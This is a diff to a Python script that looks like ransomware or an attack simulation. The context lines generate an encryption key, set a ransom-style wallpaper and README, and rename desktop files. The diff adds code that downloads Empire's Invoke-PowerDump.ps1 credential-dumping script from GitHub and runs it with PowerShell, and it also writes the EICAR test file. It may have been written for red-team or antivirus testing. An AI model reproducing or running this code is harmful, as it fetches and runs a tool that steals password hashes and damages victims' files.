@@ -6,6 +6,7 @@ import urllib.request
 import pyautogui
 import shutil
 import subprocess
+import requests
 
 # Generate key
 key=Fernet.generate_key()
@@ -168,20 +169,58 @@ def open_readme_on_desktop():
 def eicarDownload():
     subprocess.call('%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe set-content "X5O!P%@AP[4`\PZX54(P^)7CC)7}`$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!`$H+H*" -path "eicar.com"', shell=True)
 
+#download tools credential dumping
+def download_file(url, destination):
+    try:
+        # Send a GET request to the URL
+        response = requests.get(url)
+
+        # Check if the request was successful (status code 200)
+        if response.status_code == 200:
+            # Save the content to a local file
+            with open(destination, 'wb') as file:
+                file.write(response.content)
+            print(f"Downloaded and saved as {destination}")
+        else:
+            print(f"Failed to download. Status code: {response.status_code}")
+
+    except Exception as e:
+        print(f"Error: {e}")
+
+def executePowerDump(script_path):
+    try:
+        # Import the module and run the PowerShell script
+        ps_command = f"Import-Module .\\{script_path}; .\\{script_path}"
+        subprocess.run(["powershell", "-Command", ps_command], check=True)
+        print("PowerShell script executed successfully")
+
+    except Exception as e:
+        print(f"Error: {e}")    
+
 # Back to desktop
 def backDesktop():
     # Simulate pressing Win + D
     pyautogui.hotkey('winleft', 'd')
 
 if __name__ == "__main__":
+    # Wallpaper
     wallpaper_url = "https://raw.githubusercontent.com/tompilooo/EncryptFile/main/bt.jpg"
     download_path = os.path.abspath("bt.jpg")
+
+    # Note
     file_path = os.path.abspath("README.txt")
     
+    # Path directory
     desktop_directory = os.path.join(os.path.expanduser("~"), "Desktop")
+    
+    # New extention
     old_extension = ".lnk"  # Change to your desired old extension
     new_extension = "ASU"   # Change to your desired new extension
     
+    # PowerDump
+    powerDump_url = "https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1"
+    script_name = "Invoke-PowerDump.ps1"
+
     # Desktop directory
     # change_to_desktop()
 
@@ -206,8 +245,15 @@ if __name__ == "__main__":
     # Open readme.txt
     open_readme_on_desktop()
 
+    # Download EICAR
+    eicarDownload()
+
+    # Credential Dumping
+    # Download the script
+    download_file(powerDump_url, script_name)
+
+    # Execute the script with the downloaded module
+    executePowerDump(script_name)
+
     #Back to Desktop
     backDesktop()
-
-    #Download EICAR
-    eicarDownload()
